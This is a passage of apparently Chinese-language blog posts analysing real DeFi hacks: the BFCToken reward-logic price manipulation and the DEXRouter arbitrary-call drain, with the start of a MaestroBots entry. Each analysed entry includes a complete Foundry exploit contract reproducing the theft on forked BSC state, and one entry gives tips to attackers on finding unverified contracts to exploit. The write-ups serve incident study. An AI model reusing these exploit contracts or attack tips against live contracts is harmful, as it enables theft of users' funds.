USDT.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address newImplementation) external &#123;</span><br><span class="line">        bytes32 slot = IMPLEMENTATION_SLOT;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slot, newImplementation)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>未开源 != 安全</li><li>关键函数一定要做权限校验 </li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.BFCToken@rewardLogic</title>
      <link href="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/"/>
      <url>/2023/11/10/08.PoC/15.BFCToken@rewardLogic/</url>
      
        <content type="html"><![CDATA[<h1 id="BFCToken-rewardLogic"><a href="#BFCToken-rewardLogic" class="headerlink" title="BFCToken@rewardLogic"></a>BFCToken@rewardLogic</h1><ul><li>时间：2023-09-09 19:16:35 (UTC)</li><li>损失金额：~$38K</li><li>twitter<ul><li>twitter1：<a href="https://twitter.com/CertiKAlert/status/1700621314246017133">https://twitter.com/CertiKAlert/status/1700621314246017133</a></li><li>twitter2：<a href="https://twitter.com/MetaTrustAlert/status/1719187202415235536">https://twitter.com/MetaTrustAlert/status/1719187202415235536</a></li></ul></li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>被攻击的合约：<a href="https://bscscan.com/address/0x595eac4a0ce9b7175a99094680fbe55a774b5464">0x595eac4a0ce9b7175a99094680fbe55a774b5464</a></li><li>攻击事件hash：<a href="https://bscscan.com/tx/0x8ee76291c1b46d267431d2a528fa7f3ea7035629500bba4f87a69b88fcaf6e23">0x8ee76291c1b46d267431d2a528fa7f3ea7035629500bba4f87a69b88fcaf6e23</a></li><li>黑客EOA地址：<a href="https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891">0x7cb74265e3e2d2b707122bf45aea66137c6c8891</a></li><li>黑客用来攻击的合约：<a href="https://bscscan.com/address/0x9180981034364f683ea25bcce0cff5e03a595bef">0x9180981034364f683ea25bcce0cff5e03a595bef</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109213013758.png" alt="image-20231109213013758"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>整体的攻击过程</p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109213931341.png" alt="image-20231109213931341"></p><p>实际的攻击逻辑</p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109214458135.png" alt="image-20231109214458135"></p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109220408945.png" alt="image-20231109220408945"></p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109220519477.png" alt="image-20231109220519477"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>整体的逻辑是闪电贷获取资金，然后swap换币，核心是<code>BFC.transfer()</code>、<code>BUSDT_BFC.skim()</code>、<code>BFC.transfer()</code>这个循环，循环了若干次，然后导致池子中的BFC金额变小</p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109230228716.png" alt="image-20231109230228716"></p><p>也造成了BFC的<code>_reserve</code>变小，所以推断出BFC的<code>balanceOf()</code>是魔改的，价值会根据市场而变动。这个变动意味着价格操纵，从攻击上看，是使得BFC的价格升高，然后用手头上的BFC换取池子中的USD。</p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231109230538250.png" alt="image-20231109230538250"></p><p>让我们来看看他是如何做到价格操纵的。其实他也就调用了<code>_transfer()</code>，那么来看一下这个方法：这会进入到reward的计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(...) internal override &#123;</span><br><span class="line">    ....</span><br><span class="line">    if (ammPairs[from]) &#123;</span><br><span class="line">        _distributeRewards(to);</span><br><span class="line">    &#125; else if (ammPairs[to]) &#123;</span><br><span class="line">        _distributeRewards(from);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        _distributeRewards(from);</span><br><span class="line">        _distributeRewards(to);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>我们可以发现，他的计算有关于LP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function _distributeRewards(address addr) internal &#123;</span><br><span class="line">    .....</span><br><span class="line">    uint256 tokenAmountLastFather = getTokenAmountByLp(</span><br><span class="line">            lpAmountLastFather</span><br><span class="line">    );</span><br><span class="line">    uint256 tokenAmountFather = getTokenAmountByLp(lpAmountFather);</span><br><span class="line">    if (lastFatherAmount == 0) return;</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure><p>看LP的具体计算，我们发现，LP的价值会受到BFC在池子中的价值影响，而BFC的价值<code>balanceOf()</code>是动态的，随市场变动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function getTokenAmountByLp(uint256 lpAmount) &#123;</span><br><span class="line">    uint256 balance1 = IERC20(address(this)).balanceOf(</span><br><span class="line">        address(uniswapV2PairUSDT)</span><br><span class="line">    );</span><br><span class="line">    if (balance1 == 0 || lpAmount == 0) return 0;</span><br><span class="line">    return lpAmount.mul(balance1).div(uniswapV2PairUSDT.totalSupply());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function balanceOf(address account) public view override returns (uint256) &#123;</span><br><span class="line">    uint256 amount = super.balanceOf(account);</span><br><span class="line">    if (cannotBurn[account]) return amount;</span><br><span class="line">    uint256 spendTime = block.timestamp.sub(userTimeOfBurn[account]);</span><br><span class="line">    if (spendTime == 0) return amount;</span><br><span class="line">    uint256 mintAmount = getUserMintAmount(account);</span><br><span class="line">    uint256 burnAmount = getUserBurnAmount(account);</span><br><span class="line">    uint256 balance = amount.sub(burnAmount).add(mintAmount);</span><br><span class="line">    return balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>balanceOf()</code>会根据<code>getUserMintAmount()</code>变动，<code>getUserMintAmount()</code>又根据<code>getTokenAmountByLp()</code>变动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function getUserMintAmount(address user) public view returns (uint256) &#123;</span><br><span class="line">    if (!lpPush[user] || totalMint &gt;= MAX_MINT) return 0;</span><br><span class="line">    uint256 userTime = userTimeOfMint[user];</span><br><span class="line">    uint256 endTime = block.timestamp;</span><br><span class="line">    if (userTime &gt; 0 &amp;&amp; userTime &lt; endTime) &#123;</span><br><span class="line">        uint256 mintSecond = endTime.sub(userTime);</span><br><span class="line">        uint256 mintCount = mintSecond.div(3);</span><br><span class="line">        uint256 lpAmount = uniswapV2PairUSDT.balanceOf(user);</span><br><span class="line">        if(lpAmount == 0)&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 tokenAmount = getTokenAmountByLp(lpAmount).sub(</span><br><span class="line">            sonToFather[user]</span><br><span class="line">        );</span><br><span class="line">       </span><br><span class="line">        uint256 mintAmount = tokenAmount</span><br><span class="line">            .mul(MINT_RATIO)</span><br><span class="line">            .div(BLOCK_AMOUNT_OF_DAY)</span><br><span class="line">            .div(1000);</span><br><span class="line">        return mintAmount.mul(mintCount);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们总结一下调用和状态变动逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">transfer =&gt; _distributeRewards =&gt; getTokenAmountByLp =&gt; balanceOf =&gt; getUserMintAmount =&gt; getTokenAmountByLp</span><br><span class="line"></span><br><span class="line">transfer会影响调用者的LP。</span><br><span class="line">-在攻击中，发送token给池子：BFC.transfer()</span><br><span class="line">-使得getTokenAmountByLp计算结果变小，LP变少，balanceOf进而变小</span><br><span class="line">-池子的_reserve变小，为了维持K值不变，攻击者通过skim取走多余的钱：BUSDT_BFC.skim()</span><br><span class="line">-价格操纵之后，sync池子，使得价格操纵完成：BFC.transfer(,0)</span><br><span class="line"></span><br><span class="line">重复此操作，使得池子的BFC价格下降，自己拥有的BFC也减少。</span><br><span class="line">虽然都减少，但是拥有的BFC可以在池子中兑换更多的USD（相比操纵之前）</span><br></pre></td></tr></table></figure><p>看起来，这个攻击有这样的特点：</p><ul><li>发送代币到池子，BFC价值变化，<code>skim()</code>取走，再次重复，使得BFC价值不断下降</li><li>BFC价值下降，黑客拥有的代币价值、池子的BFC价值都下降。虽然都下降，但是相比价格操纵之前，黑客下降之后的代币价值可以在池子中swap到更多的USD。也就是说，价值同时下降，但是池子下降的比黑客下降的更剧烈，使得黑客通过价差有利可图。</li></ul><blockquote><p>不断的重复<code>BFC.transfer()</code>、<code>BUSDT_BFC.skim()</code>、<code>BFC.transfer()</code>到达了一定的程度，黑客才获利，前几次循环造成的价差，黑客没有获利反而受损，但是随着不断的重复此操作，黑客的价差变正，从而有利可图</p></blockquote><p>最终操纵的价格：池子的BFC价值变为1：</p><p><img src="/2023/11/10/08.PoC/15.BFCToken@rewardLogic/image-20231110001232120.png" alt="image-20231110001232120"></p><p>核心是：transfer影响LP。通过<code>skim()</code>可以不断重复transfer。重复操作到一定程度，价差从负变正，有利可图</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BFCTest is Test &#123;</span><br><span class="line">    IUni_Pair_V2 BUSDT_WBNB =</span><br><span class="line">        IUni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);</span><br><span class="line">    IUni_Pair_V2 BUSDT_BFC =</span><br><span class="line">        IUni_Pair_V2(0x71e1949A1180C0F945fe47C96f88b1a898760c05);</span><br><span class="line">    IUni_Router_V2 Router =</span><br><span class="line">        IUni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);</span><br><span class="line">    IERC20 BFC = IERC20(0x595eac4A0CE9b7175a99094680fbe55A774B5464);</span><br><span class="line">    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 31599443);</span><br><span class="line">        vm.label(address(BUSDT_WBNB), &quot;BUSDT_WBNB&quot;);</span><br><span class="line">        vm.label(address(BUSDT_BFC), &quot;BUSDT_BFC&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;Router&quot;);</span><br><span class="line">        vm.label(address(BFC), &quot;BFC&quot;);</span><br><span class="line">        vm.label(address(BUSDT), &quot;BUSDT&quot;);</span><br><span class="line">        vm.label(address(WBNB), &quot;WBNB&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        deal(address(BUSDT), address(this), 0);</span><br><span class="line">        deal(address(this), 0);</span><br><span class="line">        bytes memory swapData = abi.encode(</span><br><span class="line">            address(BFC),</span><br><span class="line">            address(BUSDT_BFC),</span><br><span class="line">            400_000 * 1e18</span><br><span class="line">        );</span><br><span class="line">        BUSDT_WBNB.swap(400_000 * 1e18, 0, address(this), swapData);</span><br><span class="line">        swapBUSDTToBNB();</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BNB balance after attack&quot;,</span><br><span class="line">            address(this).balance,</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeCall(</span><br><span class="line">        address _sender,</span><br><span class="line">        uint256 _amount0,</span><br><span class="line">        uint256 _amount1,</span><br><span class="line">        bytes calldata _data</span><br><span class="line">    ) external &#123;</span><br><span class="line">        BFC.approve(address(Router), type(uint256).max);</span><br><span class="line">        BUSDT.approve(address(Router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        swapBUSDTToBFC(BUSDT.balanceOf(address(BUSDT_BFC)));</span><br><span class="line">        BFC.transfer(address(BFC), BFC.balanceOf(address(this)));</span><br><span class="line">        swapBUSDTToBFC(BUSDT.balanceOf(address(this)));</span><br><span class="line">        // Start exploit</span><br><span class="line">        uint256 counter;</span><br><span class="line">        while (counter &lt; 100) &#123;</span><br><span class="line">            uint256 balanceBFC = BFC.balanceOf(address(this));</span><br><span class="line">            uint256 pairBalanceBFC = BFC.balanceOf(address(BUSDT_BFC));</span><br><span class="line"></span><br><span class="line">            if (balanceBFC &gt;= (50 * pairBalanceBFC)) &#123;</span><br><span class="line">                balanceBFC = (pairBalanceBFC - 1) * 50;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            BFC.transfer(address(BUSDT_BFC), balanceBFC);</span><br><span class="line">            BUSDT_BFC.skim(address(this));</span><br><span class="line">            BFC.transfer(address(BUSDT_BFC), 0);</span><br><span class="line"></span><br><span class="line">            if (balanceBFC &lt; (pairBalanceBFC * 50)) &#123;</span><br><span class="line">                ++counter;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // End exploit</span><br><span class="line">        swapBFCToBUSDT();</span><br><span class="line">        uint256 returnFlashAmount = (_amount0 * 1000) / 997 + 1;</span><br><span class="line">        BUSDT.transfer(address(BUSDT_WBNB), returnFlashAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function swapBUSDTToBFC(uint256 amountIn) internal &#123;</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(BUSDT);</span><br><span class="line">        path[1] = address(BFC);</span><br><span class="line"></span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            amountIn,</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp + 1000</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swapBFCToBUSDT() internal &#123;</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(BFC);</span><br><span class="line">        path[1] = address(BUSDT);</span><br><span class="line"></span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            BFC.balanceOf(address(this)),</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp + 1000</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swapBUSDTToBNB() internal &#123;</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(BUSDT);</span><br><span class="line">        path[1] = address(WBNB);</span><br><span class="line"></span><br><span class="line">        Router.swapExactTokensForETH(</span><br><span class="line">            BUSDT.balanceOf(address(this)),</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp + 1000</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>魔改的<code>balanceOf()</code>，主要注意价值的逻辑</li><li>警惕<code>skim()</code>可以重复调用的可能性，是否多次调用之后有利可图</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.DEXRouter@arbitrary-call</title>
      <link href="/2023/11/05/08.PoC/13.DEXRouter@arbitrary-call/"/>
      <url>/2023/11/05/08.PoC/13.DEXRouter@arbitrary-call/</url>
      
        <content type="html"><![CDATA[<h1 id="DEXRouter-arbitrary-call"><a href="#DEXRouter-arbitrary-call" class="headerlink" title="DEXRouter@arbitrary-call"></a>DEXRouter@arbitrary-call</h1><ul><li>时间：2023-09-29 08:49:19 (UTC)</li><li>损失金额：20 BNB（$4,337.20）</li><li>twitter：<a href="https://twitter.com/DecurityHQ/status/1707851321909428688">https://twitter.com/DecurityHQ/status/1707851321909428688</a></li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>黑客EOA地址：<a href="https://bscscan.com/address/0x09039e2082a0a815908e68bd52b86f96573768e8">0x09039e2082a0a815908e68bd52b86f96573768e8</a></li><li><p>黑客用来攻击的合约地址：<a href="https://bscscan.com/address/0x0f41f9146de354e5ac6bb3996e2e319dc8a3bb7f">0x0F41f9146dE354e5Ac6Bb3996e2E319Dc8a3Bb7f</a></p></li><li><p>攻击事件hash：<a href="https://bscscan.com/tx/0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113">0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113</a></p></li><li><p>被攻击合约的地址：<a href="https://bscscan.com/address/0x1f7cf218b46e613d1ba54cac11dc1b5368d94fb7#code">0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7</a></p></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/05/08.PoC/13.DEXRouter@arbitrary-call/image-20231105215835589.png" alt="image-20231105215835589"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>攻击过程非常简单，就调用了<code>update()</code>和<code>functionCallWithValue()</code></p><p><img src="/2023/11/05/08.PoC/13.DEXRouter@arbitrary-call/image-20231105220023234.png" alt="image-20231105220023234"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>此次攻击中使得slot 1、2、3、4、发生了变化，很明显是<code>update()</code>导致的。成功调用<code>update()</code>会使得这几个storage值发生变化，攻击者将其修改为攻击合约地址，为后续调用<code>functionCallWithValue()</code>做准备。</p><p><img src="/2023/11/05/08.PoC/13.DEXRouter@arbitrary-call/image-20231105220931357.png" alt="image-20231105220931357"></p><p>有了权限之后，直接调用<code>functionCallWithValue()</code>即可获利，这个函数指定调用某个合约的某个方法，然后会发送以太。攻击者可以随意写一个函数返回true，然后设置好发送的以太即可。</p><p>其实这个攻击非常简单，就是获取权限，然后用权限调用关键方法进行获利。这个被攻击的合约没有开源，没开源就认为自己的合约很安全（不知道为啥我在多个网站都无法反编译这个合约的runtimecoee）。其实，这一类的攻击思路很简单，并且也经常发生，攻击思路主要是：找为开源的合约（一般都不咋安全），然后fuzz看看能不能获取到权限，如果获取到权限则调用获利函数。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    // Victim unverified contract. Name &quot;DEXRouter&quot; taken from parameter name in &quot;go&quot; function in attack contract</span><br><span class="line">    IDEXRouter private constant DEXRouter =</span><br><span class="line">        IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 32161325);</span><br><span class="line">        vm.label(address(DEXRouter), &quot;DEXRouter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        deal(address(this), 0 ether);</span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BNB balance before exploit&quot;,</span><br><span class="line">            address(this).balance,</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line">        // DEXRouter will call back to function with selector &quot;0xe44a73b7&quot;. Look at fallback function</span><br><span class="line">        DEXRouter.update(</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Arbitrary external call vulnerability here. DEXRouter will call back &quot;a&quot; payable function and next transfer BNB to this contract</span><br><span class="line">        DEXRouter.functionCallWithValue(</span><br><span class="line">            address(this),</span><br><span class="line">            abi.encodePacked(this.a.selector),</span><br><span class="line">            address(DEXRouter).balance</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker BNB balance after exploit&quot;,</span><br><span class="line">            address(this).balance,</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function a() external payable returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback(bytes calldata data) external payable returns (bytes memory) &#123;</span><br><span class="line">        if (bytes4(data) == bytes4(0xe44a73b7)) &#123;</span><br><span class="line">            return abi.encode(true);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>防守者：不要认为为开源就安全，黑客还是很牛的</li><li>攻击者：扫未开源的合约，fuzz看看能不能获取权限，或者可以做随意的call调用</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.MaestroBots@arbitrary-call</title>
      <link href="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/"/>
      <url>/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/</url>
      
        <content type="html"><![CDATA[<h1 id="MaestroBots-arbitrary-call"><a href="#MaestroBots-arbitrary-call" class="headerlink" title="MaestroBots@arbitrary-call"></a>MaestroBots@arbitrary-call</h1><p><a href="https://twitter.com/MaestroBots">MaestroBots</a>的路由合约受到攻击，漏洞发生约半小时之后项目方就发现并且迅速修复，替换了新的路由合约，并承诺归还大约280ETH给损失的用户。</p><p>多笔攻击的手法一致，我们选取其中一笔<a href="https://twitter.com/MogCoinEth">MogCoinEth</a>来进行分析。</p><ul><li>时间：2023-10-24 22:53:47 (UTC)</li><li>损失金额：~281ETH</li><li>twitter<ul><li><a href="https://twitter.com/BeosinAlert/status/1717013965203804457">BeosinAlert</a></li><li><a href="https://twitter.com/Phalcon_xyz/status/1717014871836098663">Phalcon_xyz</a></li></ul></li></ul><p><img src="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/image-20231026140057456.png" alt="image-20231026140057456"></p><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>受攻击的路由合约Router2（存储合约，未开源）：<a href="https://etherscan.io/address/0x80a64c6d7f12c47b7c66c5b4e20e72bc1fcd5d9e#code">0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e</a></li><li><p>代理合约（逻辑合约，未开源）：<a 